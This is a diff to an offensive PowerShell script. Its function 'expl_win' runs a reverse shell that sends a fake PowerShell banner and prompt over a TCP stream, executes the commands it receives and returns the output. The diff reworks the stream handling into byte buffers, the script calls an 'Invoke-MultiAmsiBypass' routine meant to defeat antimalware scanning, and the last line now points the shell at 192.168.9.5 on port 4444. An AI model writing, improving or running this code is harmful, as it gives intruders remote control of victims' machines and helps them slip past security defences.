@@ -35,22 +35,23 @@ function expl_win
 
         $stream = $client.GetStream()
         $encoding = [System.Text.Encoding]::UTF8
-        $reader = New-Object System.IO.StreamReader($stream, $encoding)
-        $writer = New-Object System.IO.StreamWriter($stream, $encoding)
-        $writer.AutoFlush = $true
+        $bufferSize = 8192
+        [byte[]]$bytes = New-Object byte[] $bufferSize
 
         $banner = "Windows PowerShell running as user $env:username on $env:computername`n"
         $banner += "Copyright (C) Microsoft Corporation. All rights reserved.`n`n"
-        $writer.Write($banner)
-        $writer.Flush()
+        $sendBytes = $encoding.GetBytes($banner)
+        $stream.Write($sendBytes, 0, $sendBytes.Length)
+        $stream.Flush()
 
         $prompt = "PS $(Get-Location)> "
-        $writer.Write($prompt)
-        $writer.Flush()
+        $sendBytes = $encoding.GetBytes($prompt)
+        $stream.Write($sendBytes, 0, $sendBytes.Length)
+        $stream.Flush()
 
-        while (($data = $reader.ReadLine()) -ne $null)
+        while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
         {
-            $data = $data.Trim()
+            $data = $encoding.GetString($bytes, 0, $i).Trim()
             if ([string]::IsNullOrWhiteSpace($data))
             {
                 $output = ""
@@ -81,8 +82,9 @@ function expl_win
                 $sendback = $output.TrimEnd() + "`n" + $prompt
             }
 
-            $writer.Write($sendback)
-            $writer.Flush()
+            $sendBytes = $encoding.GetBytes($sendback)
+            $stream.Write($sendBytes, 0, $sendBytes.Length)
+            $stream.Flush()
         }
 
         $client.Close()
@@ -150,4 +152,4 @@ function Invoke-MultiAmsiBypass
 }
 
 Invoke-MultiAmsiBypass
-expl_win -Reverse -IPAddress 192.168.x.x -Port 4444
+expl_win -Reverse -IPAddress 192.168.9.5 -Port 4444
